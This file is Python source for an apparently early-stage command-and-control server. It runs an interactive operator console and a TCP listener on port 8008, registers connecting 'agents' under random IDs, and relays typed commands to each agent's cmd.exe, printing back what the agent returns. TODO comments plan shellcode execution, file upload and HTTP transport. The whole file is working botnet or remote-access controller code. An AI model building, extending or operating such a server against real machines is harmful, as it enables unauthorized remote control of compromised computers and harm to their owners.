import socket
import sys
import os
import threading
import queue
import time
from cmd import Cmd
from os.path import join
import hashlib
import random
import inspect

# Overview:
#  main > handles arguments, starts Terminal thread
#  CommandThread - 
#       allows to chose agent (from Global dictionary of queues!), 
#           send command to this agent
#           allow to enter shell mode
#       allows to start listener
#  listener >
#       creates listening socket, 
#       starts Client Threads, 
#       creates and assigns every thread a separate queue
#       enter this queue into Global dict
#  Client Thread - as now


# TODO:
#   - verification if agent is alive?
#   - help messages of Cmd
#   - add HTTP transport
#   - use commands (getpid, upload file, exec shellcode) and cmd.exe only if 'shell' entered

def main():
    terminal = Terminal(Listeners,ClientDict)
    terminal.cmdloop()


class Terminal(Cmd):
    def __init__(self,Listeners,ClientDict):
        Cmd.__init__(self)
        self.lport = 8008
        self.lhost = "0.0.0.0"
        self.listeners = Listeners
        self.q = None
        self.ClientDict = ClientDict
        self.agent = ''
        self.prompt = '$ '
    

    def do_exit(self,args):
        time.sleep(0.5)
        os._exit(0)

    def do_start(self,args):
        if len(args.split(' ')) != 2:
            self.help_start()
        else:
            what = args.split(' ')[0]
            value = args.split(' ')[1]
            if what.lower() == "listener":
                if value.lower() == "tcp":
                    for i in range(len(self.listeners)):
                        if 'tcp' in self.listeners[i][0]:
                            tcp_listener = self.listeners[i][1](self.lhost,self.lport)
                            tcp_listener.start()
            else:
                print("[-] No such start option.")
                self.help_start()

    def help_start(self):
        # TODO
        print("start <arguments>")
        print("\tlisener <type>")
        print("\t\t<tcp>")

    def do_list(self,args):
        #print("[DBG] args.split(' '): {}".format(args.split(' ')))
        #print("[DBG] len(args.split(' ')): {}".format(len(args.split(' '))))
        if len(args.split(' ')) != 1 or args.split(' ')[0] == '':
            self.help_list()
        else:
            if (args.lower() == "agents" or args == "a"):
                print("Agents: {}".format(ClientDict))
            elif (args.lower() == "lhost"):
                print("lhost: {}".format(self.lhost))
            elif (args.lower() == "lport"):
                print("lport: {}".format(self.lport))
            elif (args.lower() == "listeners"):
                listeners_formatted = []
                for i in range(len(self.listeners)):
                    listeners_formatted.append(self.listeners[i][0].replace('listener_',''))
                print("Listeners: {}".format(" ".join(listeners_formatted)))
            else:
                print("no such option..")
                self.help_list()
    
    def help_list(self):
        # TODO
        print("list <arguments>")
        print("\tagents\n\tlhost\n\tlport\n\tlisteners")

    def do_set(self,args):
        #print("[DBG] args.split(' '): {}".format(args.split(' ')))
        #print("[DBG] len(args.split(' ')): {}".format(len(args.split(' '))))
        if (len(args.split(' ')) < 2):
            self.help_set()
        else:
            option = args.split(' ')[0]
            value = args.split(' ')[1]
            if (option.lower() == 'lhost'):
                self.lhost = value
            elif (option.lower() == 'lport'):
                self.lport = int(value)
        

    def help_set(self):
        # TODO
        print("set <argument> <value>")
        print('\tlport <port>')
        print('\tlhost <IP>')
        print('\t\tExample: set lhost 192.168.56.112')
        

    def emptyline(self):
        if self.q == None:
            pass
        else:
            self.q.put("\n")
            time.sleep(1) # To not input prompt before response
    
    def default(self, args):
        if self.q == None:
            print("[-] You need to choose agent.")
            self.help_interact()
        else:
            self.q.put(args+"\n")
        time.sleep(1) # To not input prompt before response

    def do_interact(self,args):
        if len(args.split(' ')) != 1 or args.split(' ')[0] == '':
            self.help_list()
        else:
            self.agent = args
            try:
                self.q = ClientDict[self.agent][1]
                self.prompt = '{} $ '.format(self.ClientDict[self.agent][0][0])
            except KeyError:
                print("[-] No such agent. Use: 'list agents'")
            except Exception as ex:
                print("[-] Unhandled exception: {}".format(ex))

    def help_interact(self):
        print("interact <agent_id>")
        print("To view available agents, user: list agents")

    def do_back(self,args):
        self.q = None
        self.prompt = '$ '
    
    def do_shell(self):
        if self.q == None:
            print("[-] You need to choose agent.")
            self.help_interact()
        else:
            self.q.put("shell\n")
            print("SHELL TODO")


class listener_tcp(threading.Thread):
    def __init__(self, lhost, lport):
        threading.Thread.__init__(self)
        self.lhost = lhost
        self.lport = lport

    def run(self):
        server = socket.socket()
        server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
        server.bind((self.lhost,self.lport))
        server.listen(100)

        print("[+] Starting C&C server on tcp://{}:{}".format(self.lhost,self.lport))

        while True:
            (client, client_address) = server.accept()
            q = queue.Queue()
            
            # Any agent connection goes in BotHandler threading class.
            newthread = BotHandler(client, client_address, q)
            
            #print("\n[DBG] Adding new agent to agent list...")
            randName = hashlib.sha1(hex(random.randrange(100000,200000)).split('0x')[1].encode('utf-8')).hexdigest()
            newthread.setName(str(randName))
            newthread.start()
            
            ClientDict[randName] = (client_address, q)
            #print("[DBG] Added. Agent list now: {}".format(ClientDict))


class BotHandler(threading.Thread):
    def __init__(self, client, client_address, myqueue):
        threading.Thread.__init__(self)
        self.client = client
        self.client_address = client_address
        self.ip = client_address[0]
        self.port = client_address[1]
        self.q = myqueue
    
    def run(self):
        # Handling client thread
        AgentName = threading.current_thread().getName()
        print("\n[*] Agent with ID {} connected from {}:{}\n".format(AgentName, self.ip, self.port))
        
        # Initial message for socket state check on client side.
        # If socket ok, will credate 'cmd.exe' subprocess.
        self.client.send("background checks..".encode("utf-8"))
        
        # Getting banner
        banner = ""
        while True:
            try:
                self.client.settimeout(1)
                recv = self.client.recv(4096).decode('utf-8')
            except:
                recv = ""
            if not recv:
                break
            else:
                banner += recv
        if banner:
            print("\n[*] Received banner from {}:\n\n{}".format(AgentName, banner))
        time.sleep(0.5)

        # Command loop
        while True:
            RecvBotCmd = self.q.get()
            try:
                self.client.send(RecvBotCmd.encode('utf-8'))
                cmd_response = ""
                while True:
                    try:
                        # Client returns entered command (because cmd.exe has it in input)
                        # So 
                        # if response is only as large as input - command not completed yet
                        #   .. wait longer timeout for command execution ..
                        # else - some output already is received
                        #   .. do not wait more if there's no data in socket.
                        if (len(cmd_response) <= len(RecvBotCmd)):
                            self.client.settimeout(5)
                        else:
                            self.client.settimeout(0.5)
                        recv = self.client.recv(4096).decode('utf-8')
                    except socket.timeout:
                        # if timeout exception is triggered - assume no data anymore
                        recv = ""
                    except Exception as ex:
                        print("[-] Unplanned exception while getting response: {}".format(ex))
                        break
                    
                    if not recv:
                        break
                    else:
                        cmd_response += recv
                
                # Removing sent command from response before printing output
                print(cmd_response.replace(RecvBotCmd,""))
            
            except Exception as ex:
                print("[-] Exception occured during command sending: {}".format(ex))
                break


ClientDict = {}
Listeners = []

if __name__ == '__main__':
    members = inspect.getmembers(sys.modules[__name__])
    for i in range(len(members)):
        if 'listener' in members[i][0]:
            Listeners.append(members[i])
    # Should call Listener class as:
    #   new_listener = Listeners[i][1]("192.168.56.112",8008)
    #   new_listener.start()
    # TODO test ^
    main()
